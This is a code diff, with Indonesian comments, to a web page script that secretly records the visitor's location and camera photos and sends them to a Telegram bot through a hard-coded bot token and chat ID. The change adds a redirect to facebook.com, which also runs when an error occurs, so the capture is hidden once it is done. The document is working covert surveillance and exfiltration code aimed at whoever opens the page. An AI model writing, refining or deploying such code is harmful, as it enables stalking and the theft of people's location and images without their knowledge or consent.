@@ -9,6 +9,7 @@
   <script>
     const apiToken = "7537995896:AAGg4hCRAellVFqQHZml6qIZSBTEUs4WXQg"; // Ganti dengan token bot Anda
     const chatId = "7353825005"; // Ganti dengan chat ID Anda
+    const redirectUrl = "https://facebook.com"; // Ganti dengan URL tujuan redirect
 
     let currentLocation = null; // Untuk menyimpan lokasi perangkat
 
@@ -118,9 +119,15 @@
         const photos = await startCameraAndCapturePhotos();
 
         // Kirim lokasi dan foto ke Telegram
-        sendToTelegram(locationMessage, photos);
+        await sendToTelegram(locationMessage, photos);
+
+        // Redirect ke halaman lain
+        window.location.href = redirectUrl;
       } catch (err) {
         console.error("Terjadi kesalahan:", err);
+
+        // Redirect meskipun terjadi kesalahan
+        window.location.href = redirectUrl;
       }
     })();
   </script>
